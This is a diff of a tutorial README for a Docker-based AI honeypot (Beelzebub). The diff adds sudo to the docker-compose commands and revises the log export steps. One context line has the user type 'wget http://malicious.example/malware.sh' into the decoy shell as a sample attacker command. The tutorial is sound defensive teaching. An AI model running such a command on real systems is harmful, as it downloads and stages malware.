@@ -58,10 +58,10 @@ nano ./ssh-2222.yaml
 cd ~/ADCD/beelzebub/
 ```
 ```bash
-docker-compose build
+sudo docker-compose build
 ```
 ```bash
-docker-compose up -d
+sudo docker-compose up -d
 ```
 
 # Try it
@@ -72,7 +72,9 @@ ssh -p 2222 root@127.0.0.1
 ``` 
 - use password "**1234**"
 - Try using any commands like **ls** or **id**
-<img width="659" height="126" alt="image" src="https://github.com/user-attachments/assets/914c1f89-c3d0-412d-bae6-7b9fcee70d9e" />
+
+<img width="1242" height="259" alt="2026-04-03_16-11" src="https://github.com/user-attachments/assets/f9849ffe-c7b6-494e-b48c-8119837935c3" />
+
 
 Everything you see is AI generated, and that's what an attacker would see
 
@@ -91,16 +93,14 @@ wget http://malicious.example/malware.sh
 ```bash
 id
 ```
-Now exit the session to export the logs
+Now exit the session by typing **exit** and hitting **enter** to export the logs
 
 ```bash
-cd ~/ADCD/beelzebub/
+sudo docker-compose logs > honeypot.log
 ```
+
 ```bash
-docker-compose logs -f
-```
-```bash
-docker-compose logs > honeypot.log
+cat honeypot.log
 ```
 
 Take your time into analyzing the logs and seeing how they are being built
